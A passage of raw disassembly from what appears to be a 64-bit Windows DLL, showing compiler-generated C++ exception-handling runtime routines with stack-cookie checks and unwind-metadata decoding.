   180004ee0:	e8 53 e2 ff ff       	call   0x180003138
   180004ee5:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180004eea:	4c 8d 48 20          	lea    0x20(%rax),%r9
   180004eee:	44 8b 40 18          	mov    0x18(%rax),%r8d
   180004ef2:	8b 50 04             	mov    0x4(%rax),%edx
   180004ef5:	8b 08                	mov    (%rax),%ecx
   180004ef7:	eb 0d                	jmp    0x180004f06
   180004ef9:	4c 8d 4e 20          	lea    0x20(%rsi),%r9
   180004efd:	44 8b 46 18          	mov    0x18(%rsi),%r8d
   180004f01:	8b 56 04             	mov    0x4(%rsi),%edx
   180004f04:	8b 0e                	mov    (%rsi),%ecx
   180004f06:	ff 15 a4 b1 00 00    	call   *0xb1a4(%rip)        # 0x1800100b0
   180004f0c:	44 8b 64 24 20       	mov    0x20(%rsp),%r12d
   180004f11:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   180004f16:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   180004f1b:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   180004f20:	4c 8b 6c 24 48       	mov    0x48(%rsp),%r13
   180004f25:	49 8b cd             	mov    %r13,%rcx
   180004f28:	e8 9f e0 ff ff       	call   0x180002fcc
   180004f2d:	45 85 e4             	test   %r12d,%r12d
   180004f30:	75 32                	jne    0x180004f64
   180004f32:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   180004f38:	75 2a                	jne    0x180004f64
   180004f3a:	83 7e 18 04          	cmpl   $0x4,0x18(%rsi)
   180004f3e:	75 24                	jne    0x180004f64
   180004f40:	8b 46 20             	mov    0x20(%rsi),%eax
   180004f43:	2d 20 05 93 19       	sub    $0x19930520,%eax
   180004f48:	83 f8 02             	cmp    $0x2,%eax
   180004f4b:	77 17                	ja     0x180004f64
   180004f4d:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
   180004f51:	e8 56 e2 ff ff       	call   0x1800031ac
   180004f56:	85 c0                	test   %eax,%eax
   180004f58:	74 0a                	je     0x180004f64
   180004f5a:	b2 01                	mov    $0x1,%dl
   180004f5c:	48 8b ce             	mov    %rsi,%rcx
   180004f5f:	e8 d4 e1 ff ff       	call   0x180003138
   180004f64:	e8 6b e9 ff ff       	call   0x1800038d4
   180004f69:	4c 89 78 20          	mov    %r15,0x20(%rax)
   180004f6d:	e8 62 e9 ff ff       	call   0x1800038d4
   180004f72:	48 89 78 28          	mov    %rdi,0x28(%rax)
   180004f76:	e8 59 e9 ff ff       	call   0x1800038d4
   180004f7b:	8b 8c 24 e0 00 00 00 	mov    0xe0(%rsp),%ecx
   180004f82:	89 48 78             	mov    %ecx,0x78(%rax)
   180004f85:	e8 4a e9 ff ff       	call   0x1800038d4
   180004f8a:	c7 40 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rax)
   180004f91:	48 8b c3             	mov    %rbx,%rax
   180004f94:	48 81 c4 a8 00 00 00 	add    $0xa8,%rsp
   180004f9b:	41 5f                	pop    %r15
   180004f9d:	41 5d                	pop    %r13
   180004f9f:	41 5c                	pop    %r12
   180004fa1:	5f                   	pop    %rdi
   180004fa2:	5e                   	pop    %rsi
   180004fa3:	5b                   	pop    %rbx
   180004fa4:	c3                   	ret
   180004fa5:	e8 2a 28 00 00       	call   0x1800077d4
   180004faa:	90                   	nop
   180004fab:	cc                   	int3
   180004fac:	33 c0                	xor    %eax,%eax
   180004fae:	4c 8d 1d 4b b0 ff ff 	lea    -0x4fb5(%rip),%r11        # 0x180000000
   180004fb5:	88 41 18             	mov    %al,0x18(%rcx)
   180004fb8:	0f 57 c0             	xorps  %xmm0,%xmm0
   180004fbb:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   180004fbf:	4c 8b c1             	mov    %rcx,%r8
   180004fc2:	48 89 41 24          	mov    %rax,0x24(%rcx)
   180004fc6:	0f 11 41 30          	movups %xmm0,0x30(%rcx)
   180004fca:	48 8b 41 08          	mov    0x8(%rcx),%rax
   180004fce:	44 8a 10             	mov    (%rax),%r10b
   180004fd1:	48 8d 50 01          	lea    0x1(%rax),%rdx
   180004fd5:	44 88 51 18          	mov    %r10b,0x18(%rcx)
   180004fd9:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   180004fdd:	41 f6 c2 01          	test   $0x1,%r10b
   180004fe1:	74 27                	je     0x18000500a
   180004fe3:	0f b6 0a             	movzbl (%rdx),%ecx
   180004fe6:	83 e1 0f             	and    $0xf,%ecx
   180004fe9:	4a 0f be 84 19 c0 03 	movsbq 0x103c0(%rcx,%r11,1),%rax
   180004ff0:	01 00 
   180004ff2:	42 8a 8c 19 d0 03 01 	mov    0x103d0(%rcx,%r11,1),%cl
   180004ff9:	00 
   180004ffa:	48 2b d0             	sub    %rax,%rdx
   180004ffd:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180005000:	d3 e8                	shr    %cl,%eax
   180005002:	41 89 40 1c          	mov    %eax,0x1c(%r8)
   180005006:	49 89 50 08          	mov    %rdx,0x8(%r8)
   18000500a:	41 f6 c2 02          	test   $0x2,%r10b
   18000500e:	74 0e                	je     0x18000501e
   180005010:	8b 02                	mov    (%rdx),%eax
   180005012:	48 83 c2 04          	add    $0x4,%rdx
   180005016:	49 89 50 08          	mov    %rdx,0x8(%r8)
   18000501a:	41 89 40 20          	mov    %eax,0x20(%r8)
   18000501e:	41 f6 c2 04          	test   $0x4,%r10b
   180005022:	74 27                	je     0x18000504b
   180005024:	0f b6 0a             	movzbl (%rdx),%ecx
   180005027:	83 e1 0f             	and    $0xf,%ecx
   18000502a:	4a 0f be 84 19 c0 03 	movsbq 0x103c0(%rcx,%r11,1),%rax
   180005031:	01 00 
   180005033:	42 8a 8c 19 d0 03 01 	mov    0x103d0(%rcx,%r11,1),%cl
   18000503a:	00 
   18000503b:	48 2b d0             	sub    %rax,%rdx
   18000503e:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180005041:	d3 e8                	shr    %cl,%eax
   180005043:	41 89 40 24          	mov    %eax,0x24(%r8)
   180005047:	49 89 50 08          	mov    %rdx,0x8(%r8)
   18000504b:	8b 02                	mov    (%rdx),%eax
   18000504d:	4c 8d 4a 04          	lea    0x4(%rdx),%r9
   180005051:	41 89 40 28          	mov    %eax,0x28(%r8)
   180005055:	41 8a c2             	mov    %r10b,%al
   180005058:	24 30                	and    $0x30,%al
   18000505a:	4d 89 48 08          	mov    %r9,0x8(%r8)
   18000505e:	41 f6 c2 08          	test   $0x8,%r10b
   180005062:	74 3b                	je     0x18000509f
   180005064:	3c 10                	cmp    $0x10,%al
   180005066:	75 10                	jne    0x180005078
   180005068:	49 63 09             	movslq (%r9),%rcx
   18000506b:	49 8d 41 04          	lea    0x4(%r9),%rax
   18000506f:	49 89 40 08          	mov    %rax,0x8(%r8)
   180005073:	49 89 48 30          	mov    %rcx,0x30(%r8)
   180005077:	c3                   	ret
   180005078:	3c 20                	cmp    $0x20,%al
   18000507a:	0f 85 b3 00 00 00    	jne    0x180005133
   180005080:	49 63 01             	movslq (%r9),%rax
   180005083:	49 8d 51 04          	lea    0x4(%r9),%rdx
   180005087:	49 89 50 08          	mov    %rdx,0x8(%r8)
   18000508b:	49 89 40 30          	mov    %rax,0x30(%r8)
   18000508f:	48 8d 42 04          	lea    0x4(%rdx),%rax
   180005093:	48 63 0a             	movslq (%rdx),%rcx
   180005096:	49 89 40 08          	mov    %rax,0x8(%r8)
   18000509a:	e9 90 00 00 00       	jmp    0x18000512f
   18000509f:	3c 10                	cmp    $0x10,%al
   1800050a1:	75 30                	jne    0x1800050d3
   1800050a3:	41 0f b6 09          	movzbl (%r9),%ecx
   1800050a7:	83 e1 0f             	and    $0xf,%ecx
   1800050aa:	4a 0f be 84 19 c0 03 	movsbq 0x103c0(%rcx,%r11,1),%rax
   1800050b1:	01 00 
   1800050b3:	42 8a 8c 19 d0 03 01 	mov    0x103d0(%rcx,%r11,1),%cl
   1800050ba:	00 
   1800050bb:	4c 2b c8             	sub    %rax,%r9
   1800050be:	41 8b 40 48          	mov    0x48(%r8),%eax
   1800050c2:	41 8b 51 fc          	mov    -0x4(%r9),%edx
   1800050c6:	d3 ea                	shr    %cl,%edx
   1800050c8:	03 c2                	add    %edx,%eax
   1800050ca:	4d 89 48 08          	mov    %r9,0x8(%r8)
   1800050ce:	49 89 40 30          	mov    %rax,0x30(%r8)
   1800050d2:	c3                   	ret
   1800050d3:	3c 20                	cmp    $0x20,%al
   1800050d5:	75 5c                	jne    0x180005133
   1800050d7:	41 0f b6 09          	movzbl (%r9),%ecx
   1800050db:	41 8b 50 48          	mov    0x48(%r8),%edx
   1800050df:	83 e1 0f             	and    $0xf,%ecx
   1800050e2:	4a 0f be 84 19 c0 03 	movsbq 0x103c0(%rcx,%r11,1),%rax
   1800050e9:	01 00 
   1800050eb:	42 8a 8c 19 d0 03 01 	mov    0x103d0(%rcx,%r11,1),%cl
   1800050f2:	00 
   1800050f3:	4c 2b c8             	sub    %rax,%r9
   1800050f6:	41 8b 41 fc          	mov    -0x4(%r9),%eax
   1800050fa:	d3 e8                	shr    %cl,%eax
   1800050fc:	4d 89 48 08          	mov    %r9,0x8(%r8)
   180005100:	8d 0c 02             	lea    (%rdx,%rax,1),%ecx
   180005103:	49 89 48 30          	mov    %rcx,0x30(%r8)
   180005107:	41 0f b6 09          	movzbl (%r9),%ecx
   18000510b:	83 e1 0f             	and    $0xf,%ecx
   18000510e:	4a 0f be 84 19 c0 03 	movsbq 0x103c0(%rcx,%r11,1),%rax
   180005115:	01 00 
   180005117:	42 8a 8c 19 d0 03 01 	mov    0x103d0(%rcx,%r11,1),%cl
   18000511e:	00 
   18000511f:	4c 2b c8             	sub    %rax,%r9
   180005122:	41 8b 41 fc          	mov    -0x4(%r9),%eax
   180005126:	d3 e8                	shr    %cl,%eax
   180005128:	4d 89 48 08          	mov    %r9,0x8(%r8)
   18000512c:	8d 0c 02             	lea    (%rdx,%rax,1),%ecx
   18000512f:	49 89 48 38          	mov    %rcx,0x38(%r8)
   180005133:	c3                   	ret
   180005134:	40 53                	rex push %rbx
   180005136:	48 83 ec 20          	sub    $0x20,%rsp
   18000513a:	4c 8b 09             	mov    (%rcx),%r9
   18000513d:	49 8b d8             	mov    %r8,%rbx
   180005140:	41 83 20 00          	andl   $0x0,(%r8)
   180005144:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   180005149:	41 b8 20 05 93 19    	mov    $0x19930520,%r8d
   18000514f:	41 8b 01             	mov    (%r9),%eax
   180005152:	3b c1                	cmp    %ecx,%eax
   180005154:	75 5d                	jne    0x1800051b3
   180005156:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   18000515b:	75 56                	jne    0x1800051b3
   18000515d:	41 8b 41 20          	mov    0x20(%r9),%eax
   180005161:	41 2b c0             	sub    %r8d,%eax
   180005164:	83 f8 02             	cmp    $0x2,%eax
   180005167:	77 17                	ja     0x180005180
   180005169:	48 8b 42 28          	mov    0x28(%rdx),%rax
   18000516d:	49 39 41 28          	cmp    %rax,0x28(%r9)
   180005171:	75 0d                	jne    0x180005180
   180005173:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   180005179:	41 8b 01             	mov    (%r9),%eax
   18000517c:	3b c1                	cmp    %ecx,%eax
   18000517e:	75 33                	jne    0x1800051b3
   180005180:	41 83 79 18 04       	cmpl   $0x4,0x18(%r9)
   180005185:	75 2c                	jne    0x1800051b3
   180005187:	41 8b 49 20          	mov    0x20(%r9),%ecx
   18000518b:	41 2b c8             	sub    %r8d,%ecx
   18000518e:	83 f9 02             	cmp    $0x2,%ecx
   180005191:	77 20                	ja     0x1800051b3
   180005193:	49 83 79 30 00       	cmpq   $0x0,0x30(%r9)
   180005198:	75 19                	jne    0x1800051b3
   18000519a:	e8 35 e7 ff ff       	call   0x1800038d4
   18000519f:	c7 40 40 01 00 00 00 	movl   $0x1,0x40(%rax)
   1800051a6:	b8 01 00 00 00       	mov    $0x1,%eax
   1800051ab:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   1800051b1:	eb 02                	jmp    0x1800051b5
   1800051b3:	33 c0                	xor    %eax,%eax
   1800051b5:	48 83 c4 20          	add    $0x20,%rsp
   1800051b9:	5b                   	pop    %rbx
   1800051ba:	c3                   	ret
   1800051bb:	cc                   	int3
   1800051bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800051c1:	57                   	push   %rdi
   1800051c2:	48 83 ec 20          	sub    $0x20,%rsp
   1800051c6:	41 8b f8             	mov    %r8d,%edi
   1800051c9:	4d 8b c1             	mov    %r9,%r8
   1800051cc:	e8 63 ff ff ff       	call   0x180005134
   1800051d1:	8b d8                	mov    %eax,%ebx
   1800051d3:	85 c0                	test   %eax,%eax
   1800051d5:	75 08                	jne    0x1800051df
   1800051d7:	e8 f8 e6 ff ff       	call   0x1800038d4
   1800051dc:	89 78 78             	mov    %edi,0x78(%rax)
   1800051df:	8b c3                	mov    %ebx,%eax
   1800051e1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800051e6:	48 83 c4 20          	add    $0x20,%rsp
   1800051ea:	5f                   	pop    %rdi
   1800051eb:	c3                   	ret
   1800051ec:	48 8b c4             	mov    %rsp,%rax
   1800051ef:	53                   	push   %rbx
   1800051f0:	56                   	push   %rsi
   1800051f1:	57                   	push   %rdi
   1800051f2:	41 54                	push   %r12
   1800051f4:	41 55                	push   %r13
   1800051f6:	41 56                	push   %r14
   1800051f8:	41 57                	push   %r15
   1800051fa:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   180005201:	0f 29 70 b8          	movaps %xmm6,-0x48(%rax)
   180005205:	48 8b 05 04 4e 01 00 	mov    0x14e04(%rip),%rax        # 0x18001a010
   18000520c:	48 33 c4             	xor    %rsp,%rax
   18000520f:	48 89 84 24 d0 00 00 	mov    %rax,0xd0(%rsp)
   180005216:	00 
   180005217:	45 8b e1             	mov    %r9d,%r12d
   18000521a:	49 8b d8             	mov    %r8,%rbx
   18000521d:	48 8b fa             	mov    %rdx,%rdi
   180005220:	4c 8b f9             	mov    %rcx,%r15
   180005223:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   180005228:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   18000522d:	48 89 54 24 78       	mov    %rdx,0x78(%rsp)
   180005232:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   180005237:	e8 e4 dd ff ff       	call   0x180003020
   18000523c:	4c 8b e8             	mov    %rax,%r13
   18000523f:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   180005244:	48 8b d7             	mov    %rdi,%rdx
   180005247:	48 8b cb             	mov    %rbx,%rcx
   18000524a:	e8 cd e7 ff ff       	call   0x180003a1c
   18000524f:	8b f0                	mov    %eax,%esi
   180005251:	83 7f 48 00          	cmpl   $0x0,0x48(%rdi)
   180005255:	74 17                	je     0x18000526e
   180005257:	e8 78 e6 ff ff       	call   0x1800038d4
   18000525c:	83 78 78 fe          	cmpl   $0xfffffffe,0x78(%rax)
   180005260:	0f 85 66 02 00 00    	jne    0x1800054cc
   180005266:	8b 77 48             	mov    0x48(%rdi),%esi
   180005269:	83 ee 02             	sub    $0x2,%esi
   18000526c:	eb 1f                	jmp    0x18000528d
   18000526e:	e8 61 e6 ff ff       	call   0x1800038d4
   180005273:	83 78 78 fe          	cmpl   $0xfffffffe,0x78(%rax)
   180005277:	74 14                	je     0x18000528d
   180005279:	e8 56 e6 ff ff       	call   0x1800038d4
   18000527e:	8b 70 78             	mov    0x78(%rax),%esi
   180005281:	e8 4e e6 ff ff       	call   0x1800038d4
   180005286:	c7 40 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rax)
   18000528d:	e8 42 e6 ff ff       	call   0x1800038d4
   180005292:	ff 40 30             	incl   0x30(%rax)
   180005295:	83 7b 08 00          	cmpl   $0x0,0x8(%rbx)
   180005299:	74 40                	je     0x1800052db
   18000529b:	48 63 53 08          	movslq 0x8(%rbx),%rdx
   18000529f:	48 03 57 08          	add    0x8(%rdi),%rdx
   1800052a3:	0f b6 0a             	movzbl (%rdx),%ecx
   1800052a6:	83 e1 0f             	and    $0xf,%ecx
   1800052a9:	4c 8d 05 50 ad ff ff 	lea    -0x52b0(%rip),%r8        # 0x180000000
   1800052b0:	4a 0f be 84 01 c0 03 	movsbq 0x103c0(%rcx,%r8,1),%rax
   1800052b7:	01 00 
   1800052b9:	42 0f b6 8c 01 d0 03 	movzbl 0x103d0(%rcx,%r8,1),%ecx
   1800052c0:	01 00 
   1800052c2:	48 2b d0             	sub    %rax,%rdx
   1800052c5:	8b 42 fc             	mov    -0x4(%rdx),%eax
   1800052c8:	d3 e8                	shr    %cl,%eax
   1800052ca:	89 84 24 b0 00 00 00 	mov    %eax,0xb0(%rsp)
   1800052d1:	48 89 94 24 b8 00 00 	mov    %rdx,0xb8(%rsp)
   1800052d8:	00 
   1800052d9:	eb 10                	jmp    0x1800052eb
   1800052db:	83 a4 24 b0 00 00 00 	andl   $0x0,0xb0(%rsp)
   1800052e2:	00 
   1800052e3:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
   1800052ea:	00 
   1800052eb:	48 8d 84 24 b0 00 00 	lea    0xb0(%rsp),%rax
   1800052f2:	00 
   1800052f3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1800052f8:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   1800052fd:	48 8d 84 24 b0 00 00 	lea    0xb0(%rsp),%rax
   180005304:	00 
   180005305:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   18000530a:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   18000530f:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180005314:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180005319:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   18000531e:	45 8b c4             	mov    %r12d,%r8d
   180005321:	8b d6                	mov    %esi,%edx
   180005323:	48 8d 8c 24 b0 00 00 	lea    0xb0(%rsp),%rcx
   18000532a:	00 
   18000532b:	e8 d8 03 00 00       	call   0x180005708
   180005330:	90                   	nop
   180005331:	48 8d 84 24 b0 00 00 	lea    0xb0(%rsp),%rax
   180005338:	00 
   180005339:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   180005340:	00 
   180005341:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   180005348:	00 
   180005349:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
   180005350:	00 
   180005351:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   180005356:	4c 3b f0             	cmp    %rax,%r14
   180005359:	0f 82 2f 01 00 00    	jb     0x18000548e
   18000535f:	4c 3b 74 24 58       	cmp    0x58(%rsp),%r14
   180005364:	0f 86 24 01 00 00    	jbe    0x18000548e
   18000536a:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   18000536f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180005374:	e8 d3 02 00 00       	call   0x18000564c
   180005379:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   18000537e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005383:	0f 10 73 10          	movups 0x10(%rbx),%xmm6
   180005387:	0f 11 b4 24 80 00 00 	movups %xmm6,0x80(%rsp)
   18000538e:	00 
   18000538f:	0f 28 44 24 30       	movaps 0x30(%rsp),%xmm0
   180005394:	66 0f 7f 84 24 a0 00 	movdqa %xmm0,0xa0(%rsp)
   18000539b:	00 00 
   18000539d:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   1800053a2:	48 8b cb             	mov    %rbx,%rcx
   1800053a5:	e8 a2 02 00 00       	call   0x18000564c
   1800053aa:	8b 43 10             	mov    0x10(%rbx),%eax
   1800053ad:	4c 2b f0             	sub    %rax,%r14
   1800053b0:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1800053b5:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1800053ba:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800053bf:	44 8b ce             	mov    %esi,%r9d
   1800053c2:	4c 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%r8
   1800053c9:	00 
   1800053ca:	41 8b d4             	mov    %r12d,%edx
   1800053cd:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1800053d2:	e8 01 04 00 00       	call   0x1800057d8
   1800053d7:	8b f0                	mov    %eax,%esi
   1800053d9:	89 44 24 44          	mov    %eax,0x44(%rsp)
   1800053dd:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   1800053e2:	45 33 c9             	xor    %r9d,%r9d
   1800053e5:	66 0f 6f c6          	movdqa %xmm6,%xmm0
   1800053e9:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1800053ee:	66 0f 7e c0          	movd   %xmm0,%eax
   1800053f2:	66 0f 73 de 04       	psrldq $0x4,%xmm6
   1800053f7:	66 0f 7e f1          	movd   %xmm6,%ecx
   1800053fb:	85 c9                	test   %ecx,%ecx
   1800053fd:	44 0f 45 c8          	cmovne %eax,%r9d
   180005401:	44 89 4c 24 40       	mov    %r9d,0x40(%rsp)
   180005406:	45 85 c9             	test   %r9d,%r9d
   180005409:	74 7e                	je     0x180005489
   18000540b:	8d 46 02             	lea    0x2(%rsi),%eax
   18000540e:	89 47 48             	mov    %eax,0x48(%rdi)
   180005411:	8d 41 ff             	lea    -0x1(%rcx),%eax
   180005414:	83 f8 01             	cmp    $0x1,%eax
   180005417:	76 17                	jbe    0x180005430
   180005419:	49 63 c9             	movslq %r9d,%rcx
   18000541c:	48 03 4f 08          	add    0x8(%rdi),%rcx
   180005420:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   180005426:	49 8b d7             	mov    %r15,%rdx
   180005429:	e8 52 08 00 00       	call   0x180005c80
   18000542e:	eb 37                	jmp    0x180005467
   180005430:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180005435:	48 8b 10             	mov    (%rax),%rdx
   180005438:	83 f9 02             	cmp    $0x2,%ecx
   18000543b:	75 0d                	jne    0x18000544a
   18000543d:	8b 84 24 8c 00 00 00 	mov    0x8c(%rsp),%eax
   180005444:	4c 8b 04 10          	mov    (%rax,%rdx,1),%r8
   180005448:	eb 0b                	jmp    0x180005455
   18000544a:	44 8b 84 24 8c 00 00 	mov    0x8c(%rsp),%r8d
   180005451:	00 
   180005452:	4c 03 c2             	add    %rdx,%r8
   180005455:	49 63 c9             	movslq %r9d,%rcx
   180005458:	48 03 4f 08          	add    0x8(%rdi),%rcx
   18000545c:	41 b9 03 01 00 00    	mov    $0x103,%r9d
   180005462:	e8 c9 08 00 00       	call   0x180005d30
   180005467:	49 8b cd             	mov    %r13,%rcx
   18000546a:	e8 d9 db ff ff       	call   0x180003048
   18000546f:	eb 18                	jmp    0x180005489
   180005471:	4c 8b 6c 24 68       	mov    0x68(%rsp),%r13
   180005476:	8b 74 24 44          	mov    0x44(%rsp),%esi
   18000547a:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   18000547f:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   180005484:	44 8b 64 24 48       	mov    0x48(%rsp),%r12d
   180005489:	e9 a3 fe ff ff       	jmp    0x180005331
   18000548e:	e8 41 e4 ff ff       	call   0x1800038d4
   180005493:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   180005497:	7e 08                	jle    0x1800054a1
   180005499:	e8 36 e4 ff ff       	call   0x1800038d4
   18000549e:	ff 48 30             	decl   0x30(%rax)
   1800054a1:	48 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%rcx
   1800054a8:	00 
   1800054a9:	48 33 cc             	xor    %rsp,%rcx
   1800054ac:	e8 0f c6 ff ff       	call   0x180001ac0
   1800054b1:	0f 28 b4 24 e0 00 00 	movaps 0xe0(%rsp),%xmm6
   1800054b8:	00 
   1800054b9:	48 81 c4 f0 00 00 00 	add    $0xf0,%rsp
   1800054c0:	41 5f                	pop    %r15
   1800054c2:	41 5e                	pop    %r14
   1800054c4:	41 5d                	pop    %r13
   1800054c6:	41 5c                	pop    %r12
   1800054c8:	5f                   	pop    %rdi
   1800054c9:	5e                   	pop    %rsi
   1800054ca:	5b                   	pop    %rbx
   1800054cb:	c3                   	ret
   1800054cc:	e8 03 23 00 00       	call   0x1800077d4
   1800054d1:	90                   	nop
   1800054d2:	cc                   	int3
   1800054d3:	cc                   	int3
   1800054d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800054d9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1800054de:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800054e3:	57                   	push   %rdi
   1800054e4:	41 54                	push   %r12
   1800054e6:	41 55                	push   %r13
   1800054e8:	41 56                	push   %r14
   1800054ea:	41 57                	push   %r15
   1800054ec:	48 83 ec 20          	sub    $0x20,%rsp
   1800054f0:	48 8b ea             	mov    %rdx,%rbp
   1800054f3:	4c 8b e9             	mov    %rcx,%r13
   1800054f6:	48 85 d2             	test   %rdx,%rdx
   1800054f9:	0f 84 bc 00 00 00    	je     0x1800055bb
   1800054ff:	45 32 ff             	xor    %r15b,%r15b
   180005502:	33 f6                	xor    %esi,%esi
   180005504:	39 32                	cmp    %esi,(%rdx)
   180005506:	0f 8e 8f 00 00 00    	jle    0x18000559b
   18000550c:	e8 23 db ff ff       	call   0x180003034
   180005511:	48 8b d0             	mov    %rax,%rdx
   180005514:	49 8b 45 30          	mov    0x30(%r13),%rax
   180005518:	4c 63 60 0c          	movslq 0xc(%rax),%r12
   18000551c:	49 83 c4 04          	add    $0x4,%r12
   180005520:	4c 03 e2             	add    %rdx,%r12
   180005523:	e8 0c db ff ff       	call   0x180003034
   180005528:	48 8b d0             	mov    %rax,%rdx
   18000552b:	49 8b 45 30          	mov    0x30(%r13),%rax
   18000552f:	48 63 48 0c          	movslq 0xc(%rax),%rcx
   180005533:	44 8b 34 0a          	mov    (%rdx,%rcx,1),%r14d
   180005537:	45 85 f6             	test   %r14d,%r14d
   18000553a:	7e 54                	jle    0x180005590
   18000553c:	48 63 c6             	movslq %esi,%rax
   18000553f:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   180005543:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180005548:	e8 e7 da ff ff       	call   0x180003034
   18000554d:	49 8b 5d 30          	mov    0x30(%r13),%rbx
   180005551:	48 8b f8             	mov    %rax,%rdi
   180005554:	49 63 04 24          	movslq (%r12),%rax
   180005558:	48 03 f8             	add    %rax,%rdi
   18000555b:	e8 c0 da ff ff       	call   0x180003020
   180005560:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   180005565:	4c 8b c3             	mov    %rbx,%r8
   180005568:	48 63 4d 04          	movslq 0x4(%rbp),%rcx
   18000556c:	48 8d 04 90          	lea    (%rax,%rdx,4),%rax
   180005570:	48 8b d7             	mov    %rdi,%rdx
   180005573:	48 03 c8             	add    %rax,%rcx
   180005576:	e8 19 f1 ff ff       	call   0x180004694
   18000557b:	85 c0                	test   %eax,%eax
   18000557d:	75 0e                	jne    0x18000558d
   18000557f:	41 ff ce             	dec    %r14d
   180005582:	49 83 c4 04          	add    $0x4,%r12
   180005586:	45 85 f6             	test   %r14d,%r14d
   180005589:	7f bd                	jg     0x180005548
   18000558b:	eb 03                	jmp    0x180005590
   18000558d:	41 b7 01             	mov    $0x1,%r15b
   180005590:	ff c6                	inc    %esi
   180005592:	3b 75 00             	cmp    0x0(%rbp),%esi
   180005595:	0f 8c 71 ff ff ff    	jl     0x18000550c
   18000559b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800055a0:	41 8a c7             	mov    %r15b,%al
   1800055a3:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   1800055a8:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1800055ad:	48 83 c4 20          	add    $0x20,%rsp
   1800055b1:	41 5f                	pop    %r15
   1800055b3:	41 5e                	pop    %r14
   1800055b5:	41 5d                	pop    %r13
   1800055b7:	41 5c                	pop    %r12
   1800055b9:	5f                   	pop    %rdi
   1800055ba:	c3                   	ret
   1800055bb:	e8 14 22 00 00       	call   0x1800077d4
   1800055c0:	cc                   	int3
   1800055c1:	cc                   	int3
   1800055c2:	cc                   	int3
   1800055c3:	cc                   	int3
   1800055c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800055c9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800055ce:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800055d3:	57                   	push   %rdi
   1800055d4:	48 83 ec 20          	sub    $0x20,%rsp
   1800055d8:	33 ed                	xor    %ebp,%ebp
   1800055da:	48 8b f9             	mov    %rcx,%rdi
   1800055dd:	39 29                	cmp    %ebp,(%rcx)
   1800055df:	7e 50                	jle    0x180005631
   1800055e1:	33 f6                	xor    %esi,%esi
   1800055e3:	e8 38 da ff ff       	call   0x180003020
   1800055e8:	48 63 4f 04          	movslq 0x4(%rdi),%rcx
   1800055ec:	48 03 c6             	add    %rsi,%rax
   1800055ef:	83 7c 01 04 00       	cmpl   $0x0,0x4(%rcx,%rax,1)
   1800055f4:	74 1b                	je     0x180005611
   1800055f6:	e8 25 da ff ff       	call   0x180003020
   1800055fb:	48 63 4f 04          	movslq 0x4(%rdi),%rcx
   1800055ff:	48 03 c6             	add    %rsi,%rax
   180005602:	48 63 5c 01 04       	movslq 0x4(%rcx,%rax,1),%rbx
   180005607:	e8 14 da ff ff       	call   0x180003020
   18000560c:	48 03 c3             	add    %rbx,%rax
   18000560f:	eb 02                	jmp    0x180005613
